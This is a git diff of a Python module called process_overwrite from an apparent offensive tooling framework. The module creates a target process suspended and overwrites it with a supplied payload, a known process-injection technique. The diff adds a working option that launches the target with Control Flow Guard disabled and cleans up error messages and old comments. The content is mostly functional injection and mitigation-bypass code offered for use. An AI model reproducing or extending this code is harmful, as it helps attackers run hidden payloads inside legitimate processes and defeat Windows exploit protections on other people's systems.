@@ -9,7 +9,7 @@ CATEGORY = 'inject'
 def register_arguments(parser):
             parser.add_argument('-p', '--payload', type=str, required=True, help='Payload, which overwrites the target')
             parser.add_argument('-t', '--target', type=str, required=True, help='Target process, to overwrite')
-            parser.add_argument('-n', '--nocfg', action='store_true', default=False, required=False, help='Target process, to overwrite')
+            parser.add_argument('-n', '--nocfg', action='store_true', default=False, required=False, help='Create the process with CFGuard disabled')
 
 class STARTUPINFOEX(ctypes.Structure):
     _fields_ = [
@@ -19,8 +19,8 @@ class STARTUPINFOEX(ctypes.Structure):
 
 class process_overwrite:
         Author = 'psycore8'
-        Description = 'Process_Overwrite Module'
-        Version = '0.1.0'
+        Description = 'Process_Overwrite Module, depends on https://github.com/hasherezade/process_overwriting'
+        Version = '0.1.2'
         DisplayName = 'PROCESS-OVERWRITE'
         pid = 0
         attr_list = any
@@ -35,6 +35,7 @@ class process_overwrite:
         def msg(self, message_type, MsgVar=None, ErrorExit=False):
             messages = {
                     'pre.head'         : f'{nstate.FormatModuleHeader(self.DisplayName, self.Version)}\n',
+                    'create.cfg'       : f'{nstate.f_out} CFGuard mitigation will be applied!',
                     'create.try'       : f'{nstate.s_note} Create suspended Process...',
                     'create.error'     : f'{nstate.s_fail} CreateProcess failed',
                     'create.success'   : f'{nstate.s_ok} CreateProcess successful! PID: {MsgVar}',
@@ -131,41 +132,30 @@ class process_overwrite:
                     print(f'VirtualProtectEx error: {ctypes.get_last_error()}')
 
         def create_nocfg_attributes(self, siex):
-            # Speicher auf Null setzen
             ctypes.memset(ctypes.byref(siex), 0, ctypes.sizeof(STARTUPINFOEX))
             siex.StartupInfo.cb = ctypes.sizeof(STARTUPINFOEX)
             
             cbAttributeListSize = ctypes.c_size_t(0)
             MitgFlags = ctypes.c_ulonglong(PROCESS_CREATION_MITIGATION_POLICY_CONTROL_FLOW_GUARD_ALWAYS_OFF)
             
-            # Erste Abfrage zur Ermittlung der Größe der Attributliste
             kernel32.InitializeProcThreadAttributeList(None, 1, 0, ctypes.byref(cbAttributeListSize))
             if not cbAttributeListSize.value:
-                print(f"[ERROR] InitializeProcThreadAttributeList failed to get the necessary size, Error = {kernel32.GetLastError():#x}")
+                print(f"InitializeProcThreadAttributeList failed: {kernel32.GetLastError():#x}")
                 return False
             
-            buffer = ctypes.create_string_buffer(cbAttributeListSize.value)
-            #siex.lpAttributeList = kernel32.HeapAlloc(kernel32.GetProcessHeap(), 0x00000004, cbAttributeListSize.value)
-            # if not siex.lpAttributeList:
-            #     print(f"[ERROR] HeapAlloc failed to allocate memory, Error = {kernel32.GetLastError():#x}")
-            #     return False
-            
+            buffer = ctypes.create_string_buffer(cbAttributeListSize.value)            
             if not kernel32.InitializeProcThreadAttributeList(buffer, 1, 0, ctypes.byref(cbAttributeListSize)):
-                print(f"[ERROR] InitializeProcThreadAttributeList failed to initialize, Error = {kernel32.GetLastError():#x}")
-                #kernel32.HeapFree(kernel32.GetProcessHeap(), 0, siex.lpAttributeList)
+                print(f"InitializeProcThreadAttributeList failed: {kernel32.GetLastError():#x}")
                 siex.lpAttributeList = None
                 return False
             
             if not kernel32.UpdateProcThreadAttribute(buffer, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, ctypes.byref(MitgFlags), ctypes.sizeof(MitgFlags), None, None):
-                print(f"[ERROR] UpdateProcThreadAttribute failed, Error = {kernel32.GetLastError():#x}")
+                print(f"UpdateProcThreadAttribute failed: {kernel32.GetLastError():#x}")
                 return False
             kernel32.DeleteProcThreadAttributeList(buffer)
             
             self.attr_list = buffer
             return True
-            #siex.lpAttributeList = ctypes.cast(buffer, LPPROC_THREAD_ATTRIBUTE_LIST)
-            
-            #return True
         
         def free_nocfg_attributes(siex):
             if siex.lpAttributeList:
@@ -188,22 +178,17 @@ class process_overwrite:
                  m('arg.error', None, True)
 
             siex = STARTUPINFOEX()
-            #siex_ptr = None
             process_flags = CREATE_SUSPENDED | CREATE_NEW_CONSOLE
 
-            ### NoCFG not ready yet!
             if self.nocfg:
+                m('create.cfg')
                 process_flags = CREATE_SUSPENDED | CREATE_NEW_CONSOLE | EXTENDED_STARTUPINFO_PRESENT
                 if not self.create_nocfg_attributes(siex):
                     self.free_nocfg_attributes(siex)
                     m('error')
-                    #return False
                 si = siex.StartupInfo
-                #si = siex_ptr
                 si.cb = ctypes.sizeof(siex)
                 siex.lpAttributeList = ctypes.cast(self.attr_list, LPPROC_THREAD_ATTRIBUTE_LIST)
-                #return True
-            
 
             m('create.try')
             success = CreateProcess(None, self.target, None, None, False, process_flags, None, None, ctypes.byref(si), ctypes.byref(pi))
